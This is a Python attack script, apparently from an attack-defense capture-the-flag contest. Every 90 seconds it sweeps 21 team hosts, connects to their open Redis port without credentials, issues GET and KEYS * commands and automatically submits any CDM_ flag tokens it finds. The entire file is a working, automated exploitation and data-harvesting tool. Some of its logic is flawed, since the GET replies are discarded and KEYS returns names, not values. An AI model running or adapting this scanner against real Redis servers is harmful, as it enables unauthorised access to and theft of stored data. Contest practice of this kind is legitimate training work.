import socket, re, time
from flag_sender import send_flag

N_EQUIPOS = 21
targets = [f'10.66.{i}.4' for i in range(1, N_EQUIPOS + 1)]
port = 6379
FLAG_RE = re.compile(r"\bCDM_[A-Z0-9_]+\b")

def redis_cmd(sock, *parts):
    line = "*" + str(len(parts)) + "\r\n"
    for p in parts:
        p = p.encode() if isinstance(p, str) else p
        line += f"${len(p)}\r\n".encode().decode() + p.decode() + "\r\n"
    sock.sendall(line.encode())
    return sock.recv(65535).decode(errors="ignore")

def run(ip):
    s = socket.create_connection((ip, port), timeout=5)
    for key in ("flag", "flags", "cdm_flag"):
        redis_cmd(s, "GET", key)
    resp = redis_cmd(s, "KEYS", "*")
    for token in resp.split():
        if token.startswith("CDM_"):
            print(f"[+] Flag encontrada en {ip}: {token}")
            print(send_flag(token))
    s.close()

def main():
    while True:
        for ip in targets:
            print(f"[+] Probando {ip}:{port}")
            try:
                run(ip)
            except Exception as e:
                print(f"[!] Redis error en {ip}: {e}")
        time.sleep(90)

if __name__ == "__main__":
    main()